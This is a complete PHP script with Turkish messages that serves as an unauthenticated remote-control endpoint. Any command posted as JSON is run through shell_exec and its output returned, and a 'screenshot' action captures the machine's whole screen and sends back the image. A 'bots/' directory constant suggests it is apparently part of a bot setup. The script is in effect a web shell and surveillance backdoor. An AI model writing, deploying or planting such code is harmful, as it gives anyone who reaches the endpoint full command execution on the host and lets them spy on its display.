<?php
header('Content-Type: application/json');

define('BOT_DIRECTORY', 'bots/');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents("php://input"), true);
    $action = isset($data['action']) ? $data['action'] : '';

    if ($action === 'exec' && !empty($data['command'])) {
        $command = escapeshellcmd($data['command']);
        $output = shell_exec($command);
        echo json_encode(["output" => $output]);
        exit;
    }

    if ($action === 'screenshot') {
        $screenshotPath = "/tmp/screenshot.png";
        shell_exec("import -window root $screenshotPath");
        if (file_exists($screenshotPath)) {
            header('Content-Type: image/png');
            readfile($screenshotPath);
            unlink($screenshotPath);
        } else {
            echo json_encode(["error" => "Screenshot alınamadı."]);
        }
        exit;
    }
}

echo json_encode(["error" => "Geçersiz istek."]);
?>
